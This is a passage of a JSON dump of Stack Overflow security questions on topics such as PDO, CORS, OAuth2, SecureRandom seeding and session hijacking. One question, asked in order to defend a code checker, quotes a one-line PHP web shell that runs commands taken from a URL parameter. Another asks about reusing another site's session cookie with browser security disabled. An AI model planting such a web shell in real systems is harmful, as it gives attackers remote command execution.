.</p>\n"},{"tags":["php","security","pdo"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12168222,"title":"PDO execution and bindparam","body":"<p>If i do this:</p>\n\n<pre><code>$qry-&gt;execute(array($usuario,$pass));\n</code></pre>\n\n<p>instead of this:</p>\n\n<pre><code>$qry-&gt;bindParam(1, $usuario);\n$qry-&gt;bindParam(2, $pass);\n$qry-&gt;execute();\n</code></pre>\n\n<p>does this give a security problem?</p>\n"},{"tags":["security","xss"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12168051,"title":"Is access-control-origin: * safe if session based auth is disallowed?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12001269/what-are-the-security-risks-of-setting-access-control-allow-origin\">What are the security risks of setting Access-Control-Allow-Origin?</a>  </p>\n</blockquote>\n\n\n\n<p>I just wan't to check I'm not overlooking something here...</p>\n\n<p>If I set <code>access-control-origin: *</code> and <strong>do not</strong> allow session based authentication, it's safe for me to serve up private data when it's requested with an access token, right? I can even allow post requests. As long as a valid access token is given I can't think of any way to attack a system like this.</p>\n\n<p>Is there a hole here?</p>\n"},{"tags":["security","forms",".htaccess","post","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":220,"score":0,"question_id":5363896,"title":"Prevent POST'ing from remote sites","body":"<p>I'm just wondering how you go about preventing people trying to fool your script &amp; POST'ing a similar looking form from a remote site.. say for example to try &amp; put in extra values into select fields you don't have in yours or something of that nature.</p>\n"},{"tags":["security","api","authentication","oauth","oauth2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12152247,"title":"What's the purpose of the client secret in OAuth2?","body":"<p>I have an app that offers an API. This app is an OAuth2 provider.</p>\n\n<p>I want to access this API (read &amp; write) with a client-side only app. I'm using <a href=\"https://github.com/andreassolberg/jso\" rel=\"nofollow\">JSO</a> to make this easier.</p>\n\n<p>It works great.</p>\n\n<p>The thing is, I don't have to enter my client secret (of the application I registered in my app) anywhere. And I understand why, it would then be available to anyone.</p>\n\n<p>So, if I can access my api without the client secret, could you explain to me what is its purpose?</p>\n"},{"tags":["security","excel","vba","certificate","excel-2007"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":410,"score":1,"question_id":2192774,"title":"Signed certificate for macro distribution","body":"<p>Is it possible to create a certificate for an Excel workbook which has some VBA macros, and distribute the certificates to a small group of users?</p>\n"},{"tags":["php","sql","security","oop","xss"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":81,"score":4,"question_id":12162223,"title":"Secure class construction","body":"<p>Is it secure to call <code>__construct()</code> in login or sign up class this way:</p>\n\n<pre><code>function __construct(PDO $DBH, $_POST['1'], $_POST['2'])\n{\n    $this-&gt;_user=$_POST['1'];\n    $this-&gt;_pass=$_POST['2'];\n    $this-&gt;_DBH=$DBH;\n}\n</code></pre>\n\n<p>I want to sanitize user input later inside this class and I'm not sure would my code be ripe for SQL injection or XSS because of class costructed with raw POST input?</p>\n"},{"tags":["java","security","x509certificate","keystore"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":187,"score":1,"question_id":12156734,"title":"Public key verification always returns \"Signature does not match\"","body":"<p>I am trying to verify the public key of a certificate. The certificate has been imported into a keystore using this command:</p>\n\n<pre><code>keytool -importcert -file cert.cer -keystore kstore.jks -alias mycert -storepass changeit\n</code></pre>\n\n<p>This is the java code I use to verify the public key:</p>\n\n<pre><code>File keyStore = new File(\"kstore.jks\");\nString keyStorePassword = \"changeit\";\nKeyStore ks = null;\ntry {\n   ks = KeyStore.getInstance(\"jks\");\n   ks.load(keyStore.toURI().toURL().openStream(), keyStorePassword.toCharArray());\n} catch (Exception e) {\n   e.printStackTrace();\n} \n\ntry {\n   Certificate cert = ks.getCertificate(\"mycert\");\n   PublicKey pk = cert.getPublicKey();\n   cert.verify(pk);\n   //cert.verify(pk, \"SunRsaSign\");\n   System.out.println(\"Keys verified\");\n} catch (Exception e) {\n   e.printStackTrace();\n}\n</code></pre>\n\n<p>The exception I get is:</p>\n\n<pre><code>java.security.SignatureException: Signature does not match.\n   at sun.security.x509.X509CertImpl.verify(X509CertImpl.java:446)\n   at sun.security.x509.X509CertImpl.verify(X509CertImpl.java:389)\n   at VerifyEBXMLSignature.runIt3(VerifyEBXMLSignature.java:62)\n   at VerifyEBXMLSignature.main(VerifyEBXMLSignature.java:41)\n</code></pre>\n\n<p>The certificate contains a public key and I do not have access to the private key.\nIs it at all possible to verify the public key against this certificate that I import into a keystore? The public key comes from the certificate itself, so it should be correct.</p>\n\n<p>What more should I look for with the certificate?</p>\n\n<p>I just got some more iformation about the certificate: It is exported from the private key. Is there anything in that process that may have be done wrong?</p>\n"},{"tags":["php","security","web-security"],"answer_count":4,"favorite_count":4,"up_vote_count":7,"down_vote_count":0,"view_count":227,"score":7,"question_id":11920450,"title":"Secure system calls with php for an online Code Checker","body":"<p>While I do know that system calls and security don't go hand in hand, there is a project for which I do need it. I'm writing a small code checker and I need to compile and execute the user submitted code to test against my test cases.</p>\n\n<p>Basically I want to run the code in a sandbox, so that it can't touch any files outside of the temporary directory and any files that it creates can't be accessed by the outside world.\nRecently I came across an exploit with with which the user could create a file say <code>shell.php</code> with the following contents.</p>\n\n<pre><code>&lt;?php\n  echo system($_GET['x']);\n?&gt;\n</code></pre>\n\n<p>This gives the attacker a remote shell and since the owner of the file is apache, the attacker could basically move around my entire <code>/var/www</code> where mysql passwords were stored along with other configuration information.</p>\n\n<p>While I am aware of threats like SQL Injections and have sanitized the user input before any operations that involve the DB, I have no idea as to how I can set up the sandbox. What are the techniques that I can use to disable system calls (right now I'm searching for the word 'system' in the user submitted code and not executing those snippets where it is found) and restrict the access to the files that the user submitted code creates. </p>\n\n<p>As of now my code checker only works for C and I plan to add support for other languages like C++, Java, Ruby and Python after I can secure it. Also I'd like to learn more about this problem that I've encountered so pointers to a place where I could learn more about web security would also be appreciated.</p>\n\n<p>My development machine is running Mac OS Lion and the deployment machine is a linux server so if a solution, that was cross platform would be most appreciated but one that dealt with just the linux machine would do too.</p>\n"},{"tags":["sql-server-2008","security","sql-server-2008-r2","windows-authentication","sql-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":27,"score":2,"question_id":12144242,"title":"how userid and password exposed in network in sql authentication","body":"<p>How is the userid and password  exposed on the network in SQL authentication and why doesn't this happen in Windows authentication?</p>\n"},{"tags":["php","security","authentication","symfony2"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12154572,"title":"Symfony2, server side PHP classes for http calls and user logged","body":"<p>In my server, a Symfony2 application is running.</p>\n\n<p>Moreover, the server has a folder where some PHP classes are put. These classes are used for utility purposes and are used by http calls (in particular by using AJAX from the pages of my website). For instance, a PHP class is used for file upload (see next figure).</p>\n\n<p><img src=\"http://i.stack.imgur.com/ksZvQ.png\" alt=\"The schema of the current use of the php utility classes\"></p>\n\n<p>The http call should be done by one of my webpage (and everything would be ok), but it could also be done from an external website. The latter http request is supposed to be a malicious one.</p>\n\n<p>Hence, I need to insert such a code in the php class to check if the user is logged in (even not is it has a specific role). <strong>How to do that by considering that I'm using Symfony2?</strong></p>\n\n<p>PS: I underline that <em>the control must be done in a generic PHP classes</em>, not in a Symfony2 controller!</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["windows","wcf","security","uac"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12160090,"title":"\"HTTP could not register URL\" error after reboot","body":"<p>I'm getting the infamous error \"HTTP could not register URL <em>myurl</em>. Your process does not have access rights to this namespace (see <a href=\"http://go.microsoft.com/fwlink/?LinkId=70353\" rel=\"nofollow\">http://go.microsoft.com/fwlink/?LinkId=70353</a> for details).\" error.</p>\n\n<p>I can work around it by starting my IDE as Administrator and using netsh etc as many answers advise on SO.</p>\n\n<p>However, this has only just started occurring for me after turning my PC on today. Before, I was able to run VS not as admin and it would work fine. I've checked and my user account is still an admin on the machine.</p>\n\n<p>Can anyone tell me what may have changed in my configuration to now require this?</p>\n\n<p>I'm on Win7 Ultimate on a domain.</p>\n"},{"tags":["iphone","security","speech-recognition","voice-recognition","speaker"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12157257,"title":"Speaker Recognition in iPhone Application","body":"<p>I want to track voice by using voice recognition functionality in iPhone App for security purposes.</p>\n\n<p>Every user can record his/her voice and open the application by his/her voice being recognized only which was recored and stored in a database.</p>\n\n<p>Does anyone have an idea or sample application for this functionality and how to implement it within an iPhone Application?</p>\n"},{"tags":["java","performance","security","random","entropy"],"answer_count":12,"favorite_count":11,"up_vote_count":29,"down_vote_count":0,"view_count":17010,"score":29,"question_id":137212,"title":"How to solve performance problem with Java SecureRandom?","body":"<p>If you want a cryptographically strong random number in Java, you use SecureRandom. Unfortunately, SecureRandom can be very slow. If it uses /dev/random on Linux, it can block waiting for sufficient entropy to build up. How do you avoid the peformance penalty?</p>\n\n<p>Has anyone used <a href=\"https://uncommons-maths.dev.java.net/\" rel=\"nofollow\">Uncommon Maths</a> as a solution to this problem?</p>\n\n<p>Can anybody confirm that this performance problem has been solved in JDK 6?</p>\n"},{"tags":["wcf","security","windows-authentication","impersonation"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12156079,"title":"Impersonation within wcf","body":"<p>At the moment I'm working with a WCF service that is used by an Asp.net MVC application. </p>\n\n<p>For security reasons I'm using a guid that represents a username and pasword. ( When the user logs in, WCF checks the credentials in active directory and creates a record in a databasetable that connects the guid with the username and pasword)\nWhen the user uses another service, I send this guid along in the header.\nI want to impersonate the user in wcf using this guid.\nI've tried the folowing (using authorizationManager) but this doesn't work.</p>\n\n<pre><code> public class MyAuthBehaviour :ServiceAuthorizationManager\n    {\n        public override bool CheckAccess(OperationContext operationContext, ref Message message)\n        {\n\n            var index = operationContext.IncomingMessageHeaders.FindHeader(\"identifier\", \"\");\n\n            if (index &gt;= 0)\n            {\n                string identifier = operationContext.IncomingMessageHeaders.GetHeader&lt;string&gt;(index);\n                AddWindowsID(identifier);\n            }           \n            return true;\n        }\n\n        private void AddWindowsID(string identifier)\n        {\n            WindowsIdentity wid = AccountBL.GetWindowsIdentity(identifier);\n            wid.Impersonate();\n        }      \n    }\n</code></pre>\n\n<p>I do get the WindowsIdentity but I can't Impersonate. \nIs there a way to do this?</p>\n\n<p>To say it short: I want to impersonate a user within WCF before it gets to the actual service method using the guid in the header. </p>\n\n<p>When wid.Impersonate() hits, the client throws this exception:</p>\n\n<blockquote>\n  <p>The server was unable to process the request due to an internal error.\n  For more information about the error, either turn on\n  IncludeExceptionDetailInFaults (either from ServiceBehaviorAttribute\n  or from the  configuration behavior) on the server in\n  order to send the exception information back to the client, or turn on\n  tracing as per the Microsoft .NET Framework SDK documentation and\n  inspect the server trace logs.</p>\n</blockquote>\n\n<p>WCF keeps on running.(although other exceptions where trown in the WCF services)</p>\n\n<p>The exception isn't thrown when wid.Impersonate() is executed, it occurs when we're leaving the MyAuthBehaviour class</p>\n"},{"tags":["php","security"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":123,"score":6,"question_id":12064647,"title":"Is there a ready-to-use Session Hijacking protection API?","body":"<p>I have looked into many threads that discuss preventing Session hijacking &amp; fixation but I feel that there are always details I'm missing out.</p>\n\n<p>What I'm looking for is something with the same principle as what HTML Purifier does against XSS, but in this case against Session hijacking and fixation.</p>\n\n<p>Is there an API or a PHP class made by anyone that covers everything that can be done to prevent Session Hijacking and Fixation?</p>\n\n<p>Or is it better to do it on my own?</p>\n\n<p>Thanks in advance. Regards</p>\n"},{"tags":["php","security","symfony2","fosuserbundle"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":193,"score":1,"question_id":11921162,"title":"In FOSUserBundle, how to create an alternative logout","body":"<p>Using FOSUserBundle and Symfony2,</p>\n\n<p>in my site, depending on the roles of the user that is logged in, I want to make the Logout to redirect alternatively to two different pages.</p>\n\n<p>So, I want to do something like this:</p>\n\n<pre><code>{% if is_granted(\"ROLE_PREMIUM\") %}\n  &lt;a href=\"{{ path('fos_user_security_logout_premium') }}\"&gt;{{ 'layout.logout'|trans({}, 'FOSUserBundle') }}&lt;/a&gt;\n{% else %}\n  &lt;a href=\"{{ path('fos_user_security_logout') }}\"&gt;{{ 'layout.logout'|trans({}, 'FOSUserBundle') }}&lt;/a&gt;\n{% endif %}\n</code></pre>\n\n<p>And then, somehow, do something like this:</p>\n\n<pre><code>&lt;route id=\"fos_user_security_logout\" pattern=\"/logout\"&gt;\n    &lt;default key=\"_controller\"&gt;FOSUserBundle:Security:logout&lt;/default&gt;\n&lt;/route&gt;\n&lt;route id=\"fos_seller_security_logout\" pattern=\"/logoutPremium\"&gt;\n    &lt;default key=\"_controller\"&gt;FOSUserBundle:Security:logoutPremium&lt;/default&gt;\n&lt;/route&gt;\n</code></pre>\n\n<p>But, since all in logout is done in <code>config.yml</code>, putting all this configuration about login and logout, I don't know how to configure a second trigger and implement it. Actually, the only thing that I want to do is to redirect the user to two different pages according to the role. All the rest should stay the same.</p>\n\n<p>Anything to put around here in <code>security.yml</code>?</p>\n\n<pre><code>        logout:\n          path:   /logout\n          target: /main/user\n</code></pre>\n\n<p>Thanks a lot</p>\n"},{"tags":["php","mysql","security","soap"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12153280,"title":"Website testing tools which are very essential","body":"<p>I have developed a web application, in which data is more secure and i expose web services to my clients also. So i am looking for open source tools to </p>\n\n<ol>\n<li>Security testing of the application </li>\n<li>SOAP Testing. </li>\n</ol>\n\n<p>Can you please suggest tools for both.</p>\n"},{"tags":["security","web-security","hacking"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":37,"score":2,"question_id":12152864,"title":"key stretching VS key stengthening","body":"<p>To quote from <a href=\"http://en.wikipedia.org/wiki/Key_derivation_function\" rel=\"nofollow\">this</a> wiki article -</p>\n\n<blockquote>\n  <p>An alternative approach, called key strengthening, extends the key\n  with a random salt, but then (unlike in key stretching) securely\n  deletes the salt. This forces both the attacker and legitimate users\n  to perform a brute-force search for the salt value.</p>\n</blockquote>\n\n<p>I am comfortable with what key stretching does, But I am confused on how key strengthening is achieved. How the key can be validated again if the salt is deleted?</p>\n\n<p>Thanks.</p>\n"},{"tags":["security","mongodb","encryption","nosql"],"answer_count":2,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":1691,"score":6,"question_id":8803332,"title":"MongoDB database encryption","body":"<p>I'm looking to design a webapp which stores private information securely using MongoDB. I would like to encrypt the entire database but it looks like it's not supported. What routes can I take to encrypt my database?</p>\n"},{"tags":["security","browser"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12152306,"title":"circumventing browser security for a demo","body":"<p>I have a demo to make in which first a secure session is created with domain (let's call it paranoids.com), and then a bunch of locally read html+javascript (my demo) want to use that secure session. We are using google-chrome, started with --disable-web-security and --allow-file-access-from-files, on a linux/openSuse platform.</p>\n\n<p>Why do I need to do that? I need to scrape some pages from that domain and re-render them with an alternative renderer. We have absolutely no say with that other domain owner.</p>\n\n<p>What's the best possible approach for this, without asking my poor breadgiver to go through technical hoops? Can my script access the JSESSIONID of the domain paranoids.com when run with some command line arguments? Or, is it just not possible, and must the user  copy/paste the cookie manually?</p>\n\n<p>Thanks for any ideas that help realize that goal.</p>\n"},{"tags":["security","api","http","authentication","basic-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12151122,"title":"Basic Auth API without client storing passwords in plain text?","body":"<p>I want to build an API that uses HTTP Basic Auth, but to do this I would need the client to store the user's password in plain text and then send it along with every request. I really don't want to do this. </p>\n\n<p>I can't use OAuth for this API, or have the client register their app to use the API.</p>\n\n<p>Any suggestions on alturnative methods of authorisation? </p>\n"},{"tags":["php","mysql","security","login","hmac"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":58,"score":0,"question_id":12151447,"title":"tips on hmac function, for login","body":"<p>Hi all i am working on putting together a new login system for my database which will hopeful be more secure than my old  md5 password encryption page.. \ni am just wondering if i could get some tips on this bit of code i am going to be going to use for it... mainly if there are anythings i can or should do to improve the security on this part... Many thanks...</p>\n\n<pre><code>$sql=\"SELECT * FROM `users` WHERE username='$user'\";\n$result=mysql_query($sql);\n\n\nwhile($rows=mysql_fetch_array($result)){\n$salt=$rows['salt'];\n$site_key=$rows['site_key'];\n}\n\n      function hash_password($salt,$pass,$site_key) {\n  global $site_key;\n  return hash_hmac('sha512',$pass . $salt, $site_key);\n}\n$password=hash_password();\n$hashed= mysql_real_escape_string($password);\n</code></pre>\n"},{"tags":["algorithm","security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":63,"score":-1,"question_id":12149696,"title":"searching for a specific encryption algorithm","body":"<h1>update!</h1>\n\n<p>if so, the NEW Q will be:</p>\n\n<blockquote>\n  <p>what is the strongest encryption algorithm ? (no time limits)<br>\n  note that the algorithm can Not make more letters than the input</p>\n</blockquote>\n"},{"tags":["security","networking","port","legal"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12150356,"title":"What is the legality of distributing network security software?","body":"<p>I created a simple program in java for some basic Network Security practices. The features of the program make it so that it could possibly be usable for malicious reasons as well, although its made for testing security on your own network. It does stuff like quickly scanning what ports are open on a certain IP (quite quickly), scanning IP ranges/subnets for a certain open port, tests how computers hold up against packet flooding, and the like. I made it to test some things internally on my network and to learn how such things work, and thought either the sourcecode or the compiled program might be useful to others for the same purpose.</p>\n\n<p>Being that this software has the potential for malicious use (even though I would put in the EULA or similar that it is ONLY for testing systems you are fully authorized to use test it on), would it be legal to distribute such software in the EU, US, etc.?</p>\n\n<p>Thanks!</p>\n\n<p>Oh, and if this is in the wrong place, if an admin/mod could please move it to the right place I would appreciate it :)</p>\n"},{"tags":["jquery","ajax","security","ssl"],"answer_count":3,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":10260,"score":4,"question_id":6418620,"title":"jQuery ajax and SSL?","body":"<p>In our site certain pages use SSL, most pages however don't (as they need to be crawled by web bots).</p>\n\n<p>It pretty much boils down to any page where the user is logged in, with a few exceptions is under SSL,</p>\n\n<p>But the user first has to login from a non https page (The login form is a form that drops from the top of the screen on any page).</p>\n\n<p>So,</p>\n\n<p>How can I force the requests over ajax to use SSL?</p>\n\n<p>Is this even secure?</p>\n"},{"tags":["security","remote-server","wmi-query","remote-administration"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":139,"score":0,"question_id":12114664,"title":"Why doesn't remote WMI query for Win32_LogonSession return LogonType = 2 instances?","body":"<p>I am running the following WMI query against a remote computer, in the security context of a user who is not an administrator on the remote computer.</p>\n\n<pre><code>select * from Win32_LogonSession where LogonType = 2\n</code></pre>\n\n<p>The query does not return any instances of Win32_LogonSession. (Note that if I run the same query as an administrative, I get back the currently logged on user, which is my goal.)</p>\n\n<p>I have followed instructions on Technet to enable remote WMI / DCOM access for this user (verified by running the following query, which returns instances of Win32_LogonSession of LogonType = 3).</p>\n\n<pre><code>select * from Win32_LogonSession\n</code></pre>\n\n<p>Here is a full sample of the C# code I am running:</p>\n\n<pre><code>var scope = new ManagementScope(\"\\\\\\\\SERVER\\\\root\\\\cimv2\")\n{\n    Options =\n    {\n        Impersonation = ImpersonationLevel.Impersonate,\n        Password = \"myPassword\",\n        Username = \"DOMAIN\\\\myUser\"\n        EnablePrivileges = true,\n        Authentication = AuthenticationLevel.Packet\n    }\n};\n\nscope.Connect();\nvar query = new ObjectQuery(\"select * from Win32_LogonSession where LogonType = 2\");\n\nusing (var searcher = new ManagementObjectSearcher(scope, query))\n{\n    var managementObjects = searcher.Get();\n\n    // managementObjects is empty!\n}\n</code></pre>\n\n<p>Why would this user only receive certain instances of Win32_LogonSession (LogonType = 3 - Network) but not others (e.g., LogonType = 2 - Interactive), even if the user has sufficient access to query WMI remotely?</p>\n\n<p>Some additional information: According to this article on The Code Project, only the LocalSystem account has sufficient access to query all logon sessions:</p>\n\n<p><a href=\"http://www.codeproject.com/Articles/7483/Enumerating-Logon-Sessions\" rel=\"nofollow\">Enumerating Logon Sessions</a> on The Code Project</p>\n\n<p>This doesn't seem to be completely true since being a member of the local Administrators group seems to be sufficient. But maybe this implies there is an undocumented restriction preventing one from granting permissions on the WMI objects without also giving full administrative rights?</p>\n"},{"tags":["c#","sql-server","security","encryption","localdb"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12097557,"title":"Client-side data encryption / SQL Server Express LocalDB","body":"<p>What are the strategies in .NET to secure semi-sensitive client-side data (so that only the application itself can use/see it)?</p>\n\n<p>Could the information be contained in an accompanying mdf file (used by SQL LocalDB) and still maintain the same level of security? If so, how?</p>\n\n<p>I understand that since we are talking about client-side application there is no absolute way to secure the data. I'm mostly looking at ways to make it difficult enough to discourage people attempting it. Ideally the solution would be (mostly) transparent to the application developers.</p>\n"},{"tags":["security","https","popup","warnings"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":121,"score":-1,"question_id":12148036,"title":"Disable Security Warning popup for HTTPS urls serverside","body":"<p>We just recently switched over to a HTTPS. IE members are annoyed by the Security Warning popup. I know how to turn it off in IE for my computer; is there a way to disable that on the server for all users?</p>\n"}]}
{"total":17772,"page":19,"pagesize":100,"questions":[{"tags":["c#","security","cryptography"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":286,"score":2,"question_id":2427714,"title":"Does anyone know how to implement a secure CNG key store in C#?","body":"<p>Or is there a standard, default one provided in 2008?</p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":136,"score":3,"question_id":12044964,"title":"PHP Storing Current Session IDs in Database using Cookies","body":"<p>I've created a login system that uses cookies and stores a session ID in a database, so your login will only work with that particular session ID. I realise this has a few problems:</p>\n\n<ol>\n<li>If you login on another device the session ID changes (no multi logins)</li>\n<li>The session ID is really the only thing identifying the user as logged in (I'm not really sure if this is a security risk since the cookie is domain specific)</li>\n</ol>\n\n<p>However I want to retain the persistant login that comes with cookies while still keeping stuff secure. </p>\n\n<p>Effectively I want to know if there is a better way to securely log a user into a website using cookies.</p>\n"},{"tags":["php","linux","apache","security","amazon-ec2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12146959,"title":"Safely serving other people's PHP","body":"<p>I have an Amazon ec2 instance (linux).</p>\n\n<p>I'd like you (yes, you) to be able to upload a PHP file and then serve it live on www.mydomain.com/yourname. I'd also like to be able to do this for numerous other people (www.mydomain.com/theirname).</p>\n\n<p>I'm worried that you (or they, let's not point fingers) could do malicious things (purposefully or accidentally). For example, an infinite loop, reading/writing outside of one's root directory, taking the server down, running system commands, etc. This is what I would try if I wanted to be malicious.</p>\n\n<p>Is there any way to set up PHP/apache/user permissions, or maybe search through their code before serving it, so that being malicious would at least be much, much harder?</p>\n"},{"tags":["ruby","security","cryptography","prng"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":129,"score":4,"question_id":12118406,"title":"Is Ruby's seed for OpenSSL::Random sufficient?","body":"<p>I know very little about Ruby, so please forgive me if the answer to this is obvious.  I noticed at <a href=\"http://www.ruby-doc.org/stdlib-1.9.3/libdoc/securerandom/rdoc/SecureRandom.html\" rel=\"nofollow\">http://www.ruby-doc.org/stdlib-1.9.3/libdoc/securerandom/rdoc/SecureRandom.html</a> that Ruby uses the pid and the current time to seed OpenSSL::Random when a call to random_bytes is made.  Unless something else happens under the covers, isn't this pretty much the seed that Netscape used in their initial SSL implementation in the mid 90s?\n  <a href=\"http://en.wikipedia.org/wiki/Random_number_generator_attack#Prominent_examples_of_random_number_generator_security_issues\" rel=\"nofollow\">http://en.wikipedia.org/wiki/Random_number_generator_attack#Prominent_examples_of_random_number_generator_security_issues</a></p>\n\n<p>Surely Ruby hasn't revived an 18 year old bug.  What am I missing here?</p>\n\n<p>Edit: Here's the source for random_bytes.  Notice the first check to see if ruby was compiled with OpenSSL, in which case it seeds it with the pid and current time.</p>\n\n<pre><code>def self.random_bytes(n=nil)\n  n = n ? n.to_int : 16\n\n  if defined? OpenSSL::Random\n    @pid = 0 if !defined?(@pid)\n    pid = $$\n    if @pid != pid\n      now = Time.now\n      ary = [now.to_i, now.nsec, @pid, pid]\n      OpenSSL::Random.seed(ary.to_s)\n      @pid = pid\n    end\n    return OpenSSL::Random.random_bytes(n)\n  end\n\n  if !defined?(@has_urandom) || @has_urandom\n    flags = File::RDONLY\n    flags |= File::NONBLOCK if defined? File::NONBLOCK\n    flags |= File::NOCTTY if defined? File::NOCTTY\n    begin\n      File.open(\"/dev/urandom\", flags) {|f|\n        unless f.stat.chardev?\n          raise Errno::ENOENT\n        end\n        @has_urandom = true\n        ret = f.readpartial(n)\n        if ret.length != n\n          raise NotImplementedError, \"Unexpected partial read from random device: only #{ret.length} for #{n} bytes\"\n        end\n        return ret\n      }\n    rescue Errno::ENOENT\n      @has_urandom = false\n    end\n  end\n\n  if !defined?(@has_win32)\n    begin\n      require 'Win32API'\n\n      crypt_acquire_context = Win32API.new(\"advapi32\", \"CryptAcquireContext\", 'PPPII', 'L')\n      @crypt_gen_random = Win32API.new(\"advapi32\", \"CryptGenRandom\", 'LIP', 'L')\n\n      hProvStr = \" \" * 4\n      prov_rsa_full = 1\n      crypt_verifycontext = 0xF0000000\n\n      if crypt_acquire_context.call(hProvStr, nil, nil, prov_rsa_full, crypt_verifycontext) == 0\n        raise SystemCallError, \"CryptAcquireContext failed: #{lastWin32ErrorMessage}\"\n      end\n      @hProv, = hProvStr.unpack('L')\n\n      @has_win32 = true\n    rescue LoadError\n      @has_win32 = false\n    end\n  end\n  if @has_win32\n    bytes = \" \".force_encoding(\"ASCII-8BIT\") * n\n    if @crypt_gen_random.call(@hProv, bytes.size, bytes) == 0\n      raise SystemCallError, \"CryptGenRandom failed: #{lastWin32ErrorMessage}\"\n    end\n    return bytes\n  end\n\n  raise NotImplementedError, \"No random device\"\nend\n</code></pre>\n"},{"tags":["php","security","authentication","http-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12136130,"title":"Should I be using httpAuthHandler to log into my school's web authentification?","body":"<p>I want to have my users authenticate themselves via my school's authentification system because I want to limit users to students and I want to rely on the school's robust encryption.</p>\n\n<p>The authentification system requires me to spawn the browser, have the user log in, then close the browser page and return to the app. So far so good.</p>\n\n<p>I implemented this and return the username as a simple string. </p>\n\n<p>I in no way am involved with the authentification - that is through my school's interface.</p>\n\n<p>Question: should I be using HttpAuthHandler instead?</p>\n\n<p>Here is the Android code:</p>\n\n<pre><code> public class SecureAppStarter extends Activity {\n\n\nTextView report;\nWebView input;\nContext thisContext = this;\nString thisValue, url;\n\n@Override\npublic void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.starter);\n    initialize();\n\n\n    WebViewClient rclient = new WebViewClient(){\n        @Override\n        public boolean shouldOverrideUrlLoading(WebView  view, String  url){\n            return false;\n        }\n        @Override\n        public void onLoadResource(WebView  view, String  url){ \n            input.getSettings().setJavaScriptEnabled(true);\n            input.addJavascriptInterface(new CustomJavaScriptInterface(thisContext), \"Android\");\n        }\n\n        @Override\n        public void onPageFinished(WebView view, String url){\n            report.setText(\"\"+thisValue);\n            if (thisValue!= null){\n                Intent passOn = new Intent(\"arbuckle.app.MainActivity\");\n                passOn.putExtra(\"username\", thisValue);\n                startActivity(passOn);\n            }\n        }\n    };\n    rclient.onPageFinished(input, url);\n    input.setWebViewClient(rclient);\n    input.loadUrl(url);\n}\n\n\npublic class CustomJavaScriptInterface {\n    Context mContext;\n\n    CustomJavaScriptInterface(Context context) {\n\n        mContext = context;\n    }\n\n    public void getValue(String value){\n        thisValue = value;\n    }\n}\n\nprivate void initialize() {\n    report = (TextView) findViewById(R.id.tvViewName);\n    input = (WebView) findViewById(R.id.wbWebAuth);\n    url = \"http://URL.of.data.com\";\n}\n}\n</code></pre>\n\n<p>And here is the PHP code with JavaScript insertion:</p>\n\n<pre><code>&lt;?php  \n\nif (!isset($_SERVER['WEBAUTH_USER'])){\n    $login = 'Wrong username';\n}else{\n\n$login = $_SERVER['WEBAUTH_USER'];\n}\n\n$myvar = $login;\n    ?&gt;\n\n\n&lt;script type = \"text/javascript\"&gt;\njsvar = \"&lt;?php echo $myvar;?&gt;\";\nAndroid.getValue(jsvar);\n&lt;/script&gt;\n</code></pre>\n\n<p>It all works - and the login is safely tucked away behind the school's authentification system. The script grabs the user name and records it in the main activity of the app so that each order is attached to a unique user name.</p>\n\n<p>But am I using an unsecure way of grabbing this information? Is HttpWebAuth more efficient, safer or more standard for doing this?</p>\n\n<p>Any help would be welcome!</p>\n"},{"tags":["security","red5"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12146382,"title":"red5 server protection guide","body":"<p>I want to start my 